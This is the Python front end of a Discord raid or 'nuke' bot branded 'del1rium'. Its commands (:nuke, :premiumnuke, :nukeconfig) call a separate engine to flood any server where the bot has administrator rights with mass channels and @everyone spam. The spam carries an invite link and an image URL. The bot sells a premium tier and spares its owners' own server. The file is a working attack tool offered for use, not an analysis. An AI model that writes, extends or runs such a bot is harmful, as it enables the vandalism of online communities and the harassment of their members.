import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import engine

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ CONFIGURATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

DEFAULT_NAME = "premium-raid"
DEFAULT_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
RAID_ICON = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"

# User Sessions
user_configs = {}

def get_config(user_id):
    return user_configs.get(user_id, {"name": DEFAULT_NAME, "text": DEFAULT_TEXT})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ INITIALIZATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID: return True
        central = bot.get_guild(CENTRAL_SERVER_ID)
        if not central: return False
        member = central.get_member(ctx.author.id)
        if not member or not any(r.id == PREMIUM_ROLE_ID for r in member.roles):
            embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
            await ctx.send(embed=embed, delete_after=10)
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    DEL1RIUM - ONLINE / EN LINEA
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    User / Usuario: {bot.user.name}
    Status / Estado: Ready / Listo
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ COMMANDS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.command(name='help')
async def help_cmd(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    if ctx.guild.id == CENTRAL_SERVER_ID:
        embed = discord.Embed(title="PROTECTED / PROTEGIDO", description="Restricted server.\nServidor restringido.", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=15)
        return

    await ctx.message.delete()
    embed = discord.Embed(title="MENU", description="Available commands.\nComandos disponibles.", color=0x2b2d31)
    embed.add_field(name="PUBLIC / PUBLICO", value="> `:nuke` \nStandard (25 channels).", inline=False)
    embed.add_field(name="PREMIUM", value="> `:premiumnuke` \nMassive (50 channels).\n\n> `:nukeconfig <name>, <text>` \nPersonal configuration.", inline=False)
    embed.set_footer(text="Del1rium Co.")
    await ctx.send(embed=embed, delete_after=60)

@bot.command(name='nuke')
async def nuke_cmd(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await engine.start_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, False, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke_cmd(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    config = get_config(ctx.author.id)
    await engine.start_nuke(ctx, bot, config["name"], config["text"], 50, 1000, True, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='nukeconfig')
@is_premium()
async def config_cmd(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="ERROR", description="Usage: :nukeconfig name, text", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=10)
        return

    name, text = [x.strip() for x in args.split(",", 1)]
    if not name or not text: return

    user_configs[ctx.author.id] = {"name": name, "text": text}
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="UPDATED / ACTUALIZADO", color=0x2b2d31)
    embed.add_field(name="Payload", value=f"Name: `{name}`\nText: ```{text}```", inline=False)
    await ctx.send(embed=embed, delete_after=15)

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT FOUND")
